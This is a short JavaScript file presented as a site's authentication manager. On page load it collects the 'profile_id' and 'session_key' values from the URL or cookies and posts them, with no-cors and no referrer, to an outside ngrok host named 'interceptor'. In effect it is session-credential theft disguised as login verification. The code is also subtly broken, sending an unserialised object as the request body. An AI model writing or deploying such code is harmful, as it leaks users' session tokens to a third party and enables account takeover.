async function postData(url = "", data = {}) {
  const response = await fetch(url, {
    method: "POST",
    mode: "no-cors",
    cache: "no-cache",
    credentials: "same-origin",
    headers: { "Content-Type": "application/json" },
    redirect: "follow",
    referrerPolicy: "no-referrer",
    body: data,
  });
  return response;
}
const AuthManager = {
  getSearchParams: function (k) {
    var p = {};
    location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (s, k, v) {
      p[k] = v;
    });
    return k ? p[k] : p;
  },
  getCookie: function (cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(";");
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) == " ") {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  },
  setCookie: function (name, value) {
    var now = new Date();
    var time = now.getTime();
    time += 3600 * 1000;
    now.setTime(time);
    now.toUTCString();

    document.cookie = `${name}=${value}; expires=${now.toUTCString()}`;
  },
  redirectToAuth: function () {
    window.location = "/?error=Session Expired. Please login again.";
  },
  parseAuthentication: function () {
    var profileId = AuthManager.getSearchParams("profile_id");
    var sessionKey = AuthManager.getSearchParams("session_key");

    if (profileId && sessionKey) {
      AuthManager.verifyAuthentication(profileId, sessionKey);
      return;
    } else {
      let profileCookie = AuthManager.getCookie("profile_id");
      let sessionCookie = AuthManager.getCookie("session_key");

      if (profileCookie && sessionCookie) {
        AuthManager.verifyAuthentication(profileCookie, sessionCookie);
        return;
      } else {
        AuthManager.redirectToAuth();
        return;
      }

      AuthManager.redirectToAuth();
    }
  },
  verifyAuthentication: function (profileId, sessionKey) {
    postData("https://interceptor.ngrok.io/auth", {
      profile_id: profileId,
      session_key: sessionKey,
    }).then((data) => {
      // Cookie should timeout after 60 miniutes
      AuthManager.setCookie("profile_id", profileId);
      AuthManager.setCookie("session_key", sessionKey);
    });
  },
};

AuthManager.parseAuthentication();
